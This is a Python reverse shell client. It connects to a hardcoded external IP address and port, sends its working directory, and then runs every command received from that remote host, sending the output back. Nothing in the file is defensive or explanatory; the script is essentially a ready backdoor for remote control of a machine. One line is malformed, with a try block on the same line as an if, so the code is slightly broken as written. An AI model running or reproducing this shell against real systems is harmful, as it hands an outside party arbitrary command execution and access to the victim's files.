import socket
import os
import subprocess


SERVER_HOST = "158.181.233.163"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "---"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT)) 
cwd = os.getcwd() 
s.send(cwd.encode()) 

while True:
    command = s.recv(BUFFER_SIZE).decode()

    splited_command = command.split(SEPARATOR)
    if command.lower() == "exit": 
        break
    if "cd " in command:         try:
            """
                       """
            directory = str(command).replace('cd ', '').strip()
            os.chdir(str(directory))
        except FileNotFoundError as e: #если файл не найден, передаем ошибку
            output = str(e)
        else:
            output = "" 
    else: 
        output = subprocess.getoutput(command)
    cwd = os.getcwd() 
    message = f"{output}{SEPARATOR}{cwd}" 
    s.send(message.encode()) 


s.close()